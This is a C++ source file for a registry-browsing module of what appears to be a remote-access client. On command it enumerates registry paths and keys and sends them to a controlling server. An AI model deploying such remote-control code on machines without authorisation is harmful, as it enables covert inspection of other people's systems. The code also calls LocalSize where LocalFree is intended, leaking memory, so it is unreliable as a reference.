#include "stdafx.h"
#include "RegistryManager.h"
#include "RegistryInterface.h"

CRegistryManager::CRegistryManager(CIOCPClient *IOCPClient)
	:CManager(IOCPClient)
{
	_tprintf(_T("RegistryManager is under Execution\r\n"));
	BYTE IsToken = CLIENT_REGISTRY_MANAGER_REPLY;
	_M_IOCPClient->OnServerSending((char*)&IsToken, 1);

	return;
}

CRegistryManager::~CRegistryManager()
{
	_tprintf(_T("RegistryManager Exit\r\n"));
}


void  CRegistryManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_REGISTRY_REG_FIND:
	{
		if (BufferLength > 3)
			FindRegistryData((BYTE)BufferData[1], (TCHAR*)(BufferData + 2));
		else
			FindRegistryData((BYTE)BufferData[1], NULL);

		break;
	}
	
	
	default:
		break;
	}
	return;
}

VOID  CRegistryManager::FindRegistryData(BYTE IsToken, TCHAR* FileFullPath)
{
	CRegistryInterface RegInfc(IsToken);
	if (FileFullPath != NULL)
	{
		RegInfc.SetPath(FileFullPath);
	}

	TCHAR* BufferData = RegInfc.FindPath();
	if (BufferData != NULL)
	{
		_M_IOCPClient->OnServerSending((char*)BufferData, LocalSize(BufferData));
		LocalFree(BufferData);
	}

	BufferData = RegInfc.FindKey();
	if (BufferData != NULL)
	{
		_M_IOCPClient->OnServerSending((char*)BufferData, LocalSize(BufferData));
		LocalSize(BufferData);
	}

	return;
}